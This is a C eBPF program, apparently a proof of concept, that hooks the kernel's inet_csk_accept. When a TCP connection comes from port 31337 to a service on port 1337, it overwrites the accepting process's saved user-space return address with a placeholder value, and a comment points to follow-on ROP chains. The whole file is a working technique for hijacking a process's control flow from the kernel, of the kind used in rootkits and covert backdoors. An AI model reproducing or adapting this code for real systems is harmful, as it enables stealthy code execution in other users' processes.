// SPDX-License-Identifier: GPL-2.0
// clang-format off
#ifdef LOCAL_HEADERS
#include <linux/types.h>
#include <linux/ptrace.h>
#else
#include "vmlinux.h"
#endif
// clang-format on
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>

SEC("kretprobe/inet_csk_accept")
int trace_inet_csk_accept(struct pt_regs* ctx) {
  struct task_struct* current;
  struct pt_regs* regs;
  __u32 pid;
  unsigned long last_ip;
  unsigned long new_ip = 0x4141414142424242;
  int ret;
  struct sock* newsk;
  __u16 lport = 0, rport = 0;
  __u16 protocol;
  struct sock_common sk_common;

  pid = bpf_get_current_pid_tgid() & ~(1L << 32);
  bpf_printk("Triggered for pid %d\n", pid);

  // filter on peer
  newsk = (struct sock*)(ctx->ax);
  if (newsk == NULL) return 0;

  // check if it's TCP
  bpf_core_read(&protocol, sizeof(protocol), &newsk->sk_protocol);
  bpf_printk("Protocol %d\n", protocol);

  if (protocol != IPPROTO_TCP) return 0;

  bpf_core_read(&sk_common, sizeof(sk_common), &newsk->__sk_common);
  lport = sk_common.skc_num;
  rport = sk_common.skc_dport;
  rport = rport >> 8 | rport << 8;

  bpf_printk("%d->%d\n", rport, lport);
  // only act on connections from port 31337 to service listening on port 1337
  if (lport != 1337 || rport != 31337) return 0;

  current = bpf_get_current_task_btf();
  regs = (struct pt_regs*)bpf_task_pt_regs(current);
  bpf_printk("RBP: %08x%08x\n", regs->bp >> 32, regs->bp & ~(1L << 32));
  bpf_printk("RSP: %08x%08x\n", regs->sp >> 32, regs->sp & ~(1L << 32));
  bpf_printk("RIP: %08x%08x\n", regs->ip >> 32, regs->ip & ~(1L << 32));

  ret = bpf_probe_read_user(&last_ip, sizeof(last_ip), (const void*)regs->sp);
  if (ret < 0) {
    bpf_printk("read error: %d\n", ret);
    return 0;
  }
  bpf_printk("Stored RIP: %08x%08x\n", last_ip >> 32, last_ip & ~(1L << 32));

  // overwrite return pointer. Could be used with ROP chain for example
  ret = bpf_probe_write_user((void*)regs->sp, &new_ip, sizeof(new_ip));
  if (ret < 0) {
    bpf_printk("write error: %d\n", ret);
    return 0;
  }
  return 0;
}

char LICENSE[] SEC("license") = "GPL";
